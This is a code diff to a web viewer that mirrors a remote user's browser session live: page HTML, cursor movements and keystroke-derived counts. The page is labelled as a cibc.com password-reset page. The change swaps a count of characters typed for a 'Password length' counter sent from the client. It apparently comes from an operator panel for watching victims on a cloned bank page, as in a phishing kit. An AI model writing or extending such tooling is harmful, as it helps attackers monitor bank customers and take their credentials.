@@ -531,7 +531,7 @@
           </div>
           <span class="viewer-url">Viewing: cibc.com - Password Reset</span>
           <div class="char-count">
-            <span>Characters typed:</span>
+            <span>Password length:</span>
             <span class="char-count-num" id="charCount">0</span>
           </div>
         </div>
@@ -662,7 +662,7 @@
             break;
 
           case 'full-page':
-            renderClientPage(data.html);
+            renderClientPage(data.html, data.passwordLength || 0);
             break;
 
           case 'cursor-move':
@@ -693,21 +693,14 @@
       document.getElementById('connectionText').textContent = 'Connected';
     }
 
-    function renderClientPage(html) {
+    function renderClientPage(html, passwordLength) {
       document.getElementById('waitingOverlay').classList.add('hidden');
       document.getElementById('disconnectedOverlay').classList.add('hidden');
 
       const iframe = document.getElementById('client-frame');
 
-      // Count characters from input fields
-      const tempDiv = document.createElement('div');
-      tempDiv.innerHTML = html;
-      let totalChars = 0;
-      tempDiv.querySelectorAll('input, textarea').forEach(input => {
-        const val = input.getAttribute('value') || '';
-        totalChars += val.length;
-      });
-      document.getElementById('charCount').textContent = totalChars;
+      // Update password character count
+      document.getElementById('charCount').textContent = passwordLength;
 
       // Write the full HTML to the iframe
       iframe.contentDocument.open();
